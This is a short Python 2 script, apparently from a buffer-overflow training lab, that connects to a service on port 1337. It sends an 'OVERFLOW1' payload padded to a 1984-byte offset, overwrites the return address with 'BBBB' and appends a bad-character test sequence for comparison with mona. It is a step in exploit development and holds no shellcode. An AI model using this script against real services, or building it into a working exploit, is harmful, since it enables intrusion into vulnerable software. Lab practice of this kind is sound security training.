#!/usr/bin/env python2
import socket

RHOST="10.10.160.66"
RPORT=1337

badchar_test = ""
badchars = [0x00, 0x0A, 0x07, 0x08, 0x2e, 0x2f, 0xa0, 0xa1] #know in advance because of string input

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#write all the maybe bad ones
for i in range(0x00,0xFF+1):
	if i not in badchars:
		badchar_test += chr(i)

with open("badchar_test.bin",'wb') as f:
	f.write(badchar_test)

buf_totlen=3000
offset=1984

buf="OVERFLOW1 "
buf+="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= "BBBB"
buf+= badchar_test #put here because we see it easy?
buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

#!mona compare -a esp -f c:\badchartest.bin
#to compare them
